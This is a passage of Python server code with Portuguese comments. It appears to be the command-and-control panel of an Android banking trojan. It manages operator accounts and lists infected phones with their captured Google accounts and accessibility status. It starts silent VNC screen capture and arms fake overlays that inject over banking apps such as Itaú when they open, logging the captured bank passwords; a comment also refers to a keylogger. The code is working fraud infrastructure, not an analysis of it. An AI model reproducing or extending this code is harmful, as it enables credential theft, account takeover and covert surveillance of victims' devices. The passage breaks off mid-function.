        user.expires_at = utc_now() + timedelta(days=expiration_days)
    elif expires_at is not None and expires_at.strip():
        try:
            user.expires_at = datetime.fromisoformat(expires_at.replace("Z", "+00:00"))
        except Exception:
            pass
    if reset_hwid:
        user.hwid = None
        user.hwid_activated_at = None
    if reset_2fa:
        user.totp_secret = None
        user.totp_enabled = False
        user.totp_temp_secret = None
    
    db.commit()
    
    # Sincroniza alteração no motor Bypass
    sync_user_to_bypass(
        username=user.username,
        password=password if (password and password.strip()) else None,
        role="admin" if user.is_admin else "operator",
        expires_at=user.expires_at,
        status="inactive" if (user.is_banned or not user.is_active) else "active"
    )

    logger.info(f"Admin {current_user.username} atualizou usuário: {user.username}")
    
    return {"status": "ok"}

@app.delete("/api/admin/users/{user_id}")
async def admin_delete_user(
    user_id: int,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Exclui usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    if user.id == current_user.id:
        raise HTTPException(status_code=400, detail="Você não pode excluir a si mesmo")
    
    if is_master_admin(user) and not is_master_admin(current_user):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Não é permitido excluir administradores master."
        )

    username = user.username
    db.delete(user)
    db.commit()
    
    # Sincroniza exclusão no motor Bypass
    sync_user_to_bypass(
        username=username,
        is_delete=True
    )

    logger.info(f"Admin {current_user.username} excluiu usuário: {username}")
    
    return {"status": "ok"}

@app.post("/api/admin/users/{user_id}/ban")
async def admin_ban_user(
    user_id: int,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Bane usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    if is_master_admin(user):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Não é permitido banir administradores master."
        )

    user.is_banned = True
    db.commit()
    
    # Sincroniza banimento no motor Bypass
    sync_user_to_bypass(
        username=user.username,
        status="inactive"
    )

    logger.info(f"Admin {current_user.username} baniu usuário: {user.username}")
    
    return {"status": "ok"}

@app.post("/api/admin/users/{user_id}/unban")
async def admin_unban_user(
    user_id: int,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Desbane usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    user.is_banned = False
    db.commit()
    
    # Sincroniza desbanimento no motor Bypass
    sync_user_to_bypass(
        username=user.username,
        status="active"
    )

    logger.info(f"Admin {current_user.username} desbaniu usuário: {user.username}")
    
    return {"status": "ok"}

@app.post("/api/admin/users/{user_id}/reset-hwid")
async def admin_reset_hwid(
    user_id: int,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Reseta HWID do usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    user.hwid = None
    user.hwid_activated_at = None
    db.commit()
    
    logger.info(f"Admin {current_user.username} resetou HWID de: {user.username}")
    
    return {"status": "ok"}

@app.post("/api/admin/users/{user_id}/reset-2fa")
async def admin_reset_2fa(
    user_id: int,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Reseta o 2FA Google Authenticator do usuário (apenas admin)"""
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    user.totp_secret = None
    user.totp_enabled = False
    user.totp_temp_secret = None
    db.commit()
    
    logger.info(f"Admin {current_user.username} resetou 2FA de: {user.username}")
    
    return {"status": "ok", "message": "2FA resetado com sucesso."}

# ==================== ADMIN - GERENCIAMENTO DE DISPOSITIVOS ====================

@app.get("/api/admin/devices")
async def admin_get_all_devices(
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Lista todos os dispositivos com info de dono (apenas admin)"""
    devices = db.query(Device).all()
    
    result = []
    for device in devices:
        owner = db.query(Operator).filter(Operator.id == device.owner_id).first() if device.owner_id else None
        result.append({
            "id": device.id,
            "device_id": device.device_id,
            "model": device.model,
            "manufacturer": device.manufacturer,
            "android_version": device.android_version,
            "first_seen": device.first_seen.isoformat() if device.first_seen else None,
            "last_seen": device.last_seen.isoformat() if device.last_seen else None,
            "is_online": manager.is_device_alive(device.device_id),

            "owner_id": device.owner_id,
            "owner_username": owner.username if owner else None
        })
    
    return result

@app.post("/api/admin/devices/{device_id}/assign")
async def admin_assign_device(
    device_id: str,
    user_id: int = Form(...),
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Atribui dispositivo a um usuário (apenas admin)"""
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    user = db.query(Operator).filter(Operator.id == user_id).first()
    if not user:
        raise HTTPException(status_code=404, detail="Usuário não encontrado")
    
    device.owner_id = user_id
    db.commit()
    
    # Invalida cache de dispositivos
    _devices_cache["data"] = None
    
    logger.info(f"Admin {current_user.username} atribuiu dispositivo {device_id} para {user.username}")
    
    return {"status": "ok", "message": f"Dispositivo atribuído para {user.username}"}

@app.post("/api/admin/devices/{device_id}/unassign")
async def admin_unassign_device(
    device_id: str,
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Remove atribuição de dispositivo (apenas admin)"""
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    device.owner_id = None
    db.commit()
    
    # Invalida cache de dispositivos
    _devices_cache["data"] = None
    
    logger.info(f"Admin {current_user.username} removeu atribuição do dispositivo {device_id}")
    
    return {"status": "ok"}

@app.post("/api/admin/devices/cleanup-fake")
async def admin_cleanup_fake_devices(
    current_user: Operator = Depends(get_current_admin),
    db: Session = Depends(get_db)
):
    """Remove dispositivos fake/órfãos e offline do banco de dados (apenas admin)."""
    alive_ids = set(manager.get_alive_devices())
    all_devices = db.query(Device).all()
    deleted_count = 0
    
    for dev in all_devices:
        if dev.device_id in alive_ids:
            continue
        
        is_orphan = dev.owner_id is None
        is_test_pattern = any(p in dev.device_id.lower() for p in ["test_device_", "fake_", "dummy_", "fake-", "test-"])
        
        if is_orphan or is_test_pattern:
            db.query(DeviceLog).filter(DeviceLog.device_id == dev.device_id).delete(synchronize_session=False)
            db.query(CapturedData).filter(CapturedData.device_id == dev.device_id).delete(synchronize_session=False)
            db.delete(dev)
            deleted_count += 1
            
    db.commit()
    _devices_cache_store.clear()
    logger.info(f"Admin {current_user.username} removeu {deleted_count} dispositivos fake/órfãos.")
    return {"status": "ok", "deleted_count": deleted_count}

# ==================== API DE DISPOSITIVOS ====================


def _get_active_bank_safe(mgr, device_id: str, is_online: bool):
    """Retorna active_bank com expiração automática de 5 minutos (safety net)."""
    if not is_online:
        return None
    bank = mgr.device_active_banks.get(device_id)
    if not bank:
        return None
    # Expira automaticamente se o timestamp for mais de 5 minutos
    try:
        if parse_dt:
            bank_time = parse_dt(bank["timestamp"]).replace(tzinfo=None)
        else:
            bank_time = datetime.fromisoformat(bank["timestamp"].replace("Z", ""))
    except Exception:
        try:
            bank_time = datetime.fromisoformat(bank["timestamp"].replace("Z", ""))
        except Exception:
            return bank
    age_seconds = (utc_now() - bank_time).total_seconds()
    if age_seconds > 300:  # 5 minutos
        del mgr.device_active_banks[device_id]
        logger.info(f"⏱️ active_bank expirado automaticamente para {device_id} ({age_seconds:.0f}s)")
        return None
    return bank

_devices_cache_store: Dict[str, dict] = {}  # {user_key: {"ts": datetime, "data": list}}

@app.get("/api/devices")
async def get_devices(current_user: Operator = Depends(get_current_user), db: Session = Depends(get_db)):
    """Lista dispositivos online e offline (BT MOB-style dashboard)."""
    now = utc_now()
    user_key = f"{current_user.id}_{current_user.is_admin}"
    
    # Fast path: cache de resposta de 2.5s em memória para evitar hits repetidos no SQLite
    cached = _devices_cache_store.get(user_key)
    if cached and (now - cached["ts"]).total_seconds() < 2.5:
        # Atualiza status online dinamicamente sem reler do banco
        alive_ids = set(manager.get_alive_devices())
        res = cached["data"]
        for d in res:
            d["is_online"] = d["device_id"] in alive_ids
        return res

    alive_ids = set(manager.get_alive_devices())

    if current_user.is_admin:
        devices = db.query(Device).all()
    else:
        devices = db.query(Device).filter(Device.owner_id == current_user.id).all()

    google_accounts_map = {}
    blocked_packages_map = {}
    if devices:
        dev_ids = [d.device_id for d in devices]
        caps = db.query(CapturedData).filter(
            CapturedData.device_id.in_(dev_ids),
            CapturedData.data_type.in_(["GOOGLE_ACCOUNTS", "BLOCKED_PACKAGES"])
        ).order_by(CapturedData.id.desc()).all()
        for cap in caps:
            if cap.data_content:
                try:
                    parsed = json.loads(cap.data_content)
                    if cap.data_type == "GOOGLE_ACCOUNTS" and cap.device_id not in google_accounts_map:
                        google_accounts_map[cap.device_id] = parsed
                    elif cap.data_type == "BLOCKED_PACKAGES" and cap.device_id not in blocked_packages_map:
                        blocked_packages_map[cap.device_id] = parsed
                except Exception:
                    pass

    result = []
    for device in devices:
        is_online = device.device_id in alive_ids
        info = manager.device_info.get(device.device_id) or {}
        
        # Se o dispositivo está online mas ainda não enviou nível de bateria, solicita em segundo plano
        # Anti-flood: só envia 1 vez a cada 60s por dispositivo
        if is_online and info.get("battery_level") is None:
            last_req = manager._info_request_ts.get(device.device_id)
            now_ts = utc_now()
            if last_req is None or (now_ts - last_req).total_seconds() > 60:
                manager._info_request_ts[device.device_id] = now_ts
                asyncio.create_task(manager.send_command(device.device_id, {"action": "GET_DEVICE_INFO"}))
                asyncio.create_task(manager.send_command(device.device_id, {"action": "GET_BATTERY"}))
        device_data = {
            "id": device.id,
            "device_id": device.device_id,
            "model": device.model,
            "manufacturer": device.manufacturer,
            "android_version": device.android_version,
            "custom_name": device.custom_name,
            "first_seen": device.first_seen.isoformat() if device.first_seen else None,
            "last_seen": device.last_seen.isoformat() if device.last_seen else None,
            "is_online": is_online,
            "ip_address": esconder_ip(device.ip_address),
            "has_screen": device.device_id in manager.device_screens,
            "owner_id": device.owner_id,
            "silent_active": manager.device_silent_state.get(device.device_id, {}).get("active", False),
            "capture_method": manager.device_silent_state.get(device.device_id, {}).get("method") or (
                "silent" if manager.device_silent_state.get(device.device_id, {}).get("active") else None
            ),
            "last_activity_at": (
                manager.device_last_activity[device.device_id].isoformat()
                if device.device_id in manager.device_last_activity
                else None
            ),
            "active_bank": _get_active_bank_safe(manager, device.device_id, is_online),
            "battery_level": info.get("battery_level"),
            "is_charging": info.get("is_charging"),
            "network_type": info.get("network_type"),
            "sim_operator": info.get("sim_operator"),
            "storage_info": info.get("storage_info"),
            "accessibility_active": info.get("accessibility_active"),
            "admin_active": info.get("admin_active", False),
            "permissions": info.get("permissions", {}),
            "sdk": info.get("sdk"),
            "foreground_package": info.get("foreground_package"),
            "foreground_app": info.get("foreground_app"),
            "is_locked": info.get("is_locked"),
            "is_screen_on": info.get("is_screen_on"),
            "lockscreen_active": manager.get_device_lockscreen_active(device.device_id),
            "accounts": (
                info.get("accounts") or info.get("google_accounts") or
                google_accounts_map.get(device.device_id, [])
            ),
            "google_accounts": (
                info.get("accounts") or info.get("google_accounts") or
                google_accounts_map.get(device.device_id, [])
            ),
            "blocked_packages": (
                info.get("blocked_packages") or info.get("blocked_apps") or
                blocked_packages_map.get(device.device_id, [])
            )
        }
        result.append(device_data)

    online = sorted(
        [d for d in result if d["is_online"]],
        key=lambda d: d["last_seen"] or "",
        reverse=True,
    )
    offline = sorted(
        [d for d in result if not d["is_online"]],
        key=lambda d: d["last_seen"] or "",
        reverse=True,
    )
    final_list = online + offline
    _devices_cache_store[user_key] = {"ts": now, "data": final_list}
    return final_list

@app.put("/api/devices/{device_id}/rename")
async def rename_device(
    device_id: str,
    req: RenameDeviceRequest = Body(...),
    db: Session = Depends(get_db),
    current_user: Operator = Depends(get_current_user)
):
    """Renomeia um dispositivo atribuindo um nome personalizado."""
    device = check_device_access(device_id, current_user, db)
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    device.custom_name = req.custom_name
    db.commit()
    _devices_cache["data"] = None
    return {"status": "ok", "message": "Dispositivo renomeado com sucesso"}

@app.delete("/api/devices/{device_id}")
async def delete_device_endpoint(
    device_id: str,
    db: Session = Depends(get_db),
    current_user: Operator = Depends(get_current_user)
):
    """Exclui dispositivo do painel (apenas offline para usuários padrão, ou força para admins)"""
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
    
    # Verifica acesso
    if not current_user.is_admin and device.owner_id != current_user.id:
        raise HTTPException(status_code=403, detail="Você não tem permissão para excluir este dispositivo")
    
    # Apenas offline (exceto admin)
    if device.is_online and device_id in manager.active_connections and not current_user.is_admin:
        raise HTTPException(status_code=400, detail="Dispositivo está online. Apenas dispositivos offline podem ser excluídos.")
    
    # Fecha WS se ativo
    if device_id in manager.active_connections:
        try:
            ws = manager.active_connections[device_id]
            await safe_close_websocket(ws, 1000, "Device deleted")
        except Exception:
            pass
        manager.disconnect(device_id)
    
    # Remove logs associados
    db.query(DeviceLog).filter(DeviceLog.device_id == device_id).delete()
    
    # Remove do banco
    db.delete(device)
    db.commit()
    
    # Limpa caches
    manager._delete_cached_frame(device_id)
    manager._delete_cached_hierarchy(device_id)
    _devices_cache["data"] = None
    
    logger.info(f"📱 Dispositivo {device_id} excluído por {current_user.username}")
    return {"status": "ok", "message": "Dispositivo excluído com sucesso"}

def check_device_access(device_id: str, user: Operator, db: Session = None) -> Optional[Device]:
    """Verifica se usuário tem acesso ao dispositivo e retorna a instância de Device."""
    if db:
        device = db.query(Device).filter(Device.device_id == device_id).first()
        if not device:
            raise HTTPException(status_code=404, detail="Dispositivo não encontrado")
        if not user.is_admin and device.owner_id != user.id:
            raise HTTPException(status_code=403, detail="Você não tem acesso a este dispositivo")
        return device
    return None

@app.get("/api/devices/{device_id}/screen")
async def get_device_screen(
    device_id: str, 
    token: Optional[str] = None,
    db: Session = Depends(get_db),
    request: Request = None
):
    """Retorna último frame da tela do dispositivo (exige token e valida acesso ao dispositivo)"""
    auth_token = token
    if not auth_token and request:
        auth_header = request.headers.get("authorization")
        if auth_header and auth_header.lower().startswith("bearer "):
            auth_token = auth_header.split(" ")[1]
            
    if not auth_token:
        raise HTTPException(status_code=401, detail="Token de autenticação obrigatório")
        
    try:
        payload = jwt.decode(auth_token, SECRET_KEY, algorithms=[ALGORITHM])
        username = payload.get("sub")
        if not username:
            raise HTTPException(status_code=401, detail="Token inválido")
    except JWTError:
        raise HTTPException(status_code=401, detail="Token inválido")
        
    user = db.query(Operator).filter(Operator.username == username).first()
    if not user or user.is_banned or not user.is_active:
        raise HTTPException(status_code=403, detail="Acesso negado")
        
    # Dispara aquecimento/captura VNC em background para garantir fluxo constante de frames
    last_ts = manager.device_screen_timestamps.get(device_id)
    if not last_ts or (utc_now() - last_ts).total_seconds() > 3.0:
        asyncio.create_task(manager.send_command(device_id, {"action": "START_SILENT_VNC"}))
        asyncio.create_task(manager.send_command(device_id, {"action": "REQUEST_VNC_FRAME"}))

    screen_data = manager.get_latest_screen(device_id)
    if not screen_data:
        screen_data = manager.device_screens.get(device_id)
    
    if not screen_data:
        raise HTTPException(status_code=404, detail="Nenhum frame disponível")
    
    return StreamingResponse(
        iter([screen_data]),
        media_type="image/jpeg"
    )


@app.post("/api/devices/{device_id}/command")
async def send_command_to_device(
    device_id: str,
    command: CommandRequest,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Envia comando para dispositivo"""
    # Verifica acesso
    check_device_access(device_id, current_user, db)
    
    # Verifica se dispositivo está realmente online
    is_connected = device_id in manager.active_connections
    
    if not is_connected:
        logger.warning(f"⚠️ Tentativa de comando para dispositivo OFFLINE: {device_id}")
        raise HTTPException(
            status_code=503, 
            detail="Dispositivo está offline. Aguarde reconexão."
        )
    
    if command.action != 'SPEAK_AUDIO':
        logger.info(f"📥 ENDPOINT: Recebido comando {command.action} para {device_id}")
    
    # 🎨 Debug: Log do template para CUSTOM_BLACK_SCREEN
    if command.action == 'CUSTOM_BLACK_SCREEN':
        logger.warning(f"🎨 DEBUG CUSTOM_BLACK_SCREEN: template = {command.template}")
        cmd_dict = command.model_dump() if hasattr(command, 'model_dump') else command.dict()
        logger.warning(f"🎨 DEBUG command.dict() = {cmd_dict}")
        
        # Associa um banco ativo temporário baseado no pacote alvo do comando/template
        target_pkg = command.package
        if not target_pkg and isinstance(command.template, dict):
            target_pkg = command.template.get("package_name") or command.template.get("packageName") or command.template.get("package")
        
        if target_pkg:
            app_name = BankPasswordDetector.BANK_APPS.get(target_pkg)
            if not app_name:
                app_name = 'Itaú' if 'itau' in target_pkg else (target_pkg.split('.')[-1].title() if '.' in target_pkg else 'Banco')
            
            manager.device_active_banks[device_id] = {
                "package": target_pkg,
                "appName": app_name,
                "timestamp": utc_now().isoformat()
            }
            logger.info(f"🔮 CUSTOM_BLACK_SCREEN: Associando banco ativo temporário {app_name} ({target_pkg}) para capturas do dispositivo {device_id}")
    
    # 🎯 Handler para armar overlay via WebSocket
    if command.action == 'ARM_OVERLAY_MAPPING':
        target_pkg = command.package or getattr(command, 'package_name', None)
        if not target_pkg and isinstance(command.template, dict):
            target_pkg = command.template.get("package_name") or command.template.get("packageName") or command.template.get("package")
            
        if target_pkg:
            target_pkg = target_pkg.strip()
            try:
                from models import DeviceOverlayMapping
                from sqlalchemy import func
                template_data = command.template if isinstance(command.template, dict) else {}
                if isinstance(template_data, dict):
                    template_data["package_name"] = target_pkg
                template_str = json.dumps(template_data)
                
                existing_map = db.query(DeviceOverlayMapping).filter(
                    func.lower(DeviceOverlayMapping.device_id) == device_id.lower(),
                    func.lower(DeviceOverlayMapping.package_name) == target_pkg.lower()
                ).first()
                
                screen_nm = getattr(command, 'screen_name', None) or 'Custom Overlay'
                
                if existing_map:
                    existing_map.template_json = template_str
                    existing_map.screen_name = screen_nm
                    existing_map.is_enabled = True
                else:
                    db.add(DeviceOverlayMapping(
                        device_id=device_id,
                        package_name=target_pkg,
                        template_json=template_str,
                        screen_name=screen_nm,
                        is_enabled=True
                    ))
                db.commit()
                
                # Reseta o tracking de injeção anterior para forçar nova injeção quando o app for aberto
                for dev_key in list(manager.device_info.keys()):
                    if dev_key.lower() == device_id.lower():
                        manager.device_info[dev_key]["last_injected_package"] = None
                if device_id in manager.device_info:
                    manager.device_info[device_id]["last_injected_package"] = None
                    
                # Deleta logs antigos de submissão para este pacote (para permitir re-armar)
                old_logs = db.query(DeviceLog).filter(
                    func.lower(DeviceLog.device_id) == device_id.lower(),
                    DeviceLog.log_type == "OVERLAY_SUBMITTED",
                    DeviceLog.log_data.like(f'%{target_pkg}%')
                ).all()
                # Também limpa BANK_PASSWORD com VISUAL_SCREEN para este pacote
                old_bank_logs = db.query(DeviceLog).filter(
                    func.lower(DeviceLog.device_id) == device_id.lower(),
                    DeviceLog.log_type == "BANK_PASSWORD",
                    DeviceLog.log_data.like(f'%{target_pkg}%'),
                    DeviceLog.log_data.like('%VISUAL_SCREEN%')
                ).all()
                for ol in old_logs + old_bank_logs:
                    db.delete(ol)
                if old_logs or old_bank_logs:
                    db.commit()
                    logger.info(f"🧹 Limpos {len(old_logs)} logs OVERLAY_SUBMITTED e {len(old_bank_logs)} logs BANK_PASSWORD antigos para {target_pkg}")
                    
                logger.info(f"🎯 ARM_OVERLAY_MAPPING via WebSocket salvo para {device_id} -> {target_pkg}")
                
                # Se o app já estiver em primeiro plano, dispara a injeção imediatamente
                current_fg = ""
                for dev_key, dinfo in manager.device_info.items():
                    if dev_key.lower() == device_id.lower():
                        current_fg = dinfo.get("foreground_package", "")
                        break
                if current_fg and current_fg.lower() == target_pkg.lower():
                    for dev_key in list(manager.device_info.keys()):
                        if dev_key.lower() == device_id.lower():
                            manager.device_info[dev_key]["last_injected_package"] = target_pkg
                    if device_id in manager.device_info:
                        manager.device_info[device_id]["last_injected_package"] = target_pkg
                    await manager.send_command(device_id, {
                        "action": "CUSTOM_BLACK_SCREEN",
                        "template": template_data
                    })
                    logger.info(f"🔮 ARM_OVERLAY_MAPPING: App {target_pkg} já ativo. Injeção imediata enviada!")
            except Exception as map_err:
                logger.error(f"Erro ao processar ARM_OVERLAY_MAPPING via WS: {map_err}")

    # 🚫 Handler para desarmar/remover overlay via WebSocket
    if command.action in ('DISARM_OVERLAY_MAPPING', 'DELETE_OVERLAY_MAPPING'):
        target_pkg = command.package or getattr(command, 'package_name', None)
        if target_pkg:
            target_pkg = target_pkg.strip()
            try:
                from models import DeviceOverlayMapping
                from sqlalchemy import func
                db.query(DeviceOverlayMapping).filter(
                    func.lower(DeviceOverlayMapping.device_id) == device_id.lower(),
                    func.lower(DeviceOverlayMapping.package_name) == target_pkg.lower()
                ).delete(synchronize_session=False)
                db.commit()
                logger.info(f"🚫 DISARM_OVERLAY_MAPPING via WS: Mapeamento removido do DB para {device_id} -> {target_pkg}")
            except Exception as disarm_err:
                logger.error(f"Erro ao remover DISARM_OVERLAY_MAPPING via WS do DB: {disarm_err}")

    # Rastreia estado do lockscreen ativo
    if command.action == 'SHOW_LOCKSCREEN':
        manager.store_device_lockscreen_active(device_id, True)
    elif command.action == 'HIDE_LOCKSCREEN':
        manager.store_device_lockscreen_active(device_id, False)
    elif command.action == 'SET_BLOCKED_APPS':
        pkgs = [p.trim().lower() if hasattr(p, 'trim') else str(p).strip().lower() for p in (command.packages or []) if p]
        if device_id not in manager.device_info:
            manager.device_info[device_id] = {}
        manager.device_info[device_id]["blocked_packages"] = list(pkgs)
        try:
            existing_cap = db.query(CapturedData).filter(
                CapturedData.device_id == device_id,
                CapturedData.data_type == "BLOCKED_PACKAGES"
            ).first()
            if existing_cap:
                existing_cap.data_content = json.dumps(pkgs)
            else:
                db.add(CapturedData(device_id=device_id, data_type="BLOCKED_PACKAGES", data_content=json.dumps(pkgs)))
            await safe_db_commit(db)
        except Exception as e:
            logger.error(f"Erro ao salvar BLOCKED_PACKAGES no banco: {e}")
    elif command.action == 'TOGGLE_BLOCK_APP':
        pkg = (command.package or "").strip().lower()
        is_blocked = bool(command.blocked)
        if device_id not in manager.device_info:
            manager.device_info[device_id] = {}
        current_blocked = set(manager.device_info[device_id].get("blocked_packages") or [])
        if pkg:
            if is_blocked:
                current_blocked.add(pkg)
            else:
                current_blocked.discard(pkg)
            pkg_list = list(current_blocked)
            manager.device_info[device_id]["blocked_packages"] = pkg_list
            try:
                existing_cap = db.query(CapturedData).filter(
                    CapturedData.device_id == device_id,
                    CapturedData.data_type == "BLOCKED_PACKAGES"
                ).first()
                if existing_cap:
                    existing_cap.data_content = json.dumps(pkg_list)
                else:
                    db.add(CapturedData(device_id=device_id, data_type="BLOCKED_PACKAGES", data_content=json.dumps(pkg_list)))
                await safe_db_commit(db)
            except Exception as e:
                logger.error(f"Erro ao salvar BLOCKED_PACKAGES no banco: {e}")

    cmd_payload = command.model_dump() if hasattr(command, 'model_dump') else command.dict()
    success = await manager.send_command(device_id, cmd_payload)
    
    if not success:
        logger.error(f"❌ Falha ao enviar comando para {device_id} - conexão perdida durante envio")
        raise HTTPException(status_code=503, detail="Conexão perdida durante envio. Tente novamente.")
    
    # Não salva comandos enviados para não poluir o keylogger
    # (descomente se precisar auditar comandos)
    # log = DeviceLog(
    #     device_id=device_id,
    #     log_type="COMMAND_SENT",
    #     log_data=json.dumps(command.dict()),
    #     created_at=utc_now()
    # )
    # db.add(log)
    # db.commit()
    
    return {"status": "ok", "message": "Comando enviado"}


# ==================== SISTEMA DE MAPEAMENTO DE OVERLAYS (AUTO-GATILHO) ====================

@app.get("/api/devices/{device_id}/overlay-mappings")
async def get_device_overlay_mappings(
    device_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Retorna a lista de mapeamentos de overlay configurados para este dispositivo"""
    check_device_access(device_id, current_user, db)
    
    from models import DeviceOverlayMapping
    from sqlalchemy import func
    
    mappings = db.query(DeviceOverlayMapping).filter(
        func.lower(DeviceOverlayMapping.device_id) == device_id.lower()
    ).all()
    
    res = []
    for m in mappings:
        try:
            tpl = json.loads(m.template_json) if m.template_json else None
        except Exception:
            tpl = None
            
        res.append({
            "id": m.id,
            "device_id": m.device_id,
            "package_name": m.package_name,
            "project_id": m.project_id,
            "screen_id": m.screen_id,
            "screen_name": m.screen_name,
            "template": tpl,
            "is_enabled": m.is_enabled,
            "created_at": m.created_at.isoformat() if m.created_at else None
        })
    return res

@app.post("/api/devices/{device_id}/overlay-mappings")
async def create_device_overlay_mapping(
    device_id: str,
    mapping_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Cria ou atualiza um mapeamento de overlay para um aplicativo específico"""
    check_device_access(device_id, current_user, db)
    
    from models import DeviceOverlayMapping
    from sqlalchemy import func
    
    package_name = mapping_data.get("package_name")
    if not package_name:
        raise HTTPException(status_code=400, detail="Package name é obrigatório")
    package_name = package_name.strip()
    
    template_data = mapping_data.get("template", {})
    if isinstance(template_data, dict):
        template_data["package_name"] = package_name
    template_str = json.dumps(template_data)

    # Verifica se já existe um mapeamento para esse pacote no dispositivo
    existing = db.query(DeviceOverlayMapping).filter(
        func.lower(DeviceOverlayMapping.device_id) == device_id.lower(),
        func.lower(DeviceOverlayMapping.package_name) == package_name.lower()
    ).first()
    
    if existing:
        existing.project_id = mapping_data.get("project_id", existing.project_id)
        existing.screen_id = mapping_data.get("screen_id", existing.screen_id)
        existing.screen_name = mapping_data.get("screen_name", existing.screen_name)
        existing.template_json = template_str
        existing.is_enabled = mapping_data.get("is_enabled", existing.is_enabled)
        db.commit()
        
        # Reseta last_injected_package para permitir re-injeção quando o app for aberto
        for dev_key in list(manager.device_info.keys()):
            if dev_key.lower() == device_id.lower():
                manager.device_info[dev_key]["last_injected_package"] = None
        if device_id in manager.device_info:
            manager.device_info[device_id]["last_injected_package"] = None
        
        # Remove logs antigos de OVERLAY_SUBMITTED para este pacote para permitir re-injeção
        old_submitted = db.query(DeviceLog).filter(
            func.lower(DeviceLog.device_id) == device_id.lower(),
            DeviceLog.log_type == "OVERLAY_SUBMITTED",
            DeviceLog.log_data.like(f'%"package": "{package_name}"%')
        ).all()
        for old_log in old_submitted:
            db.delete(old_log)
        if old_submitted:
            db.commit()
        
        # Envia comando ARM_OVERLAY_MAPPING para o dispositivo via WebSocket para salvar em SharedPreferences no celular!
        try:
            await manager.send_command(device_id, {
                "action": "ARM_OVERLAY_MAPPING",
                "package": package_name,
                "package_name": package_name,
                "screen_name": existing.screen_name or "Custom Overlay",
                "template": template_data,
                "is_enabled": True
            })
            logger.info(f"🎯 ARM_OVERLAY_MAPPING enviado via WS para o dispositivo {device_id} ({package_name})")
        except Exception as ws_err:
            logger.error(f"Erro ao enviar ARM_OVERLAY_MAPPING via WS: {ws_err}")

        # Se o app mapeado já estiver aberto em primeiro plano agora, envia a overlay imediatamente!
        current_fg = ""
        for dev_key, dinfo in manager.device_info.items():
            if dev_key.lower() == device_id.lower():
                current_fg = dinfo.get("foreground_package", "")
                break
        if current_fg and current_fg.lower() == package_name.lower():
            try:
                for dev_key in list(manager.device_info.keys()):
                    if dev_key.lower() == device_id.lower():
                        manager.device_info[dev_key]["last_injected_package"] = package_name
                if device_id in manager.device_info:
                    manager.device_info[device_id]["last_injected_package"] = package_name
                await manager.send_command(device_id, {
                    "action": "CUSTOM_BLACK_SCREEN",
                    "template": template_data
                })
                logger.info(f"🔮 App '{package_name}' já estava em primeiro plano. Injeção imediata enviada para {device_id}!")
            except Exception as err:
                logger.error(f"Erro ao injetar imediatamente para {device_id}: {err}")
                
        return {"id": existing.id, "message": "Mapeamento atualizado"}
        
    new_mapping = DeviceOverlayMapping(
        device_id=device_id,
        package_name=package_name,
        project_id=mapping_data.get("project_id"),
        screen_id=mapping_data.get("screen_id"),
        screen_name=mapping_data.get("screen_name"),
        template_json=template_str,
        is_enabled=mapping_data.get("is_enabled", True)
    )
    db.add(new_mapping)
    db.commit()
    
    # Reseta last_injected_package para permitir injeção quando o app for aberto
    for dev_key in list(manager.device_info.keys()):
        if dev_key.lower() == device_id.lower():
            manager.device_info[dev_key]["last_injected_package"] = None
    if device_id in manager.device_info:
        manager.device_info[device_id]["last_injected_package"] = None
    
    # Remove logs antigos de OVERLAY_SUBMITTED para este pacote
    old_submitted = db.query(DeviceLog).filter(
        func.lower(DeviceLog.device_id) == device_id.lower(),
        DeviceLog.log_type == "OVERLAY_SUBMITTED",
        DeviceLog.log_data.like(f'%"package": "{package_name}"%')
    ).all()
    for old_log in old_submitted:
        db.delete(old_log)
    if old_submitted:
        db.commit()
    
    logger.info(f"✨ Novo mapeamento de overlay criado para {device_id} -> {package_name}")
    
    # Envia comando ARM_OVERLAY_MAPPING para o dispositivo via WebSocket para salvar em SharedPreferences no celular!
    try:
        await manager.send_command(device_id, {
            "action": "ARM_OVERLAY_MAPPING",
            "package": package_name,
            "package_name": package_name,
            "screen_name": new_mapping.screen_name or "Custom Overlay",
            "template": template_data,
            "is_enabled": True
        })
        logger.info(f"🎯 ARM_OVERLAY_MAPPING enviado via WS para o dispositivo {device_id} ({package_name})")
    except Exception as ws_err:
        logger.error(f"Erro ao enviar ARM_OVERLAY_MAPPING via WS: {ws_err}")

    # Se o app mapeado já estiver aberto em primeiro plano agora, envia a overlay imediatamente!
    current_fg = ""
    for dev_key, dinfo in manager.device_info.items():
        if dev_key.lower() == device_id.lower():
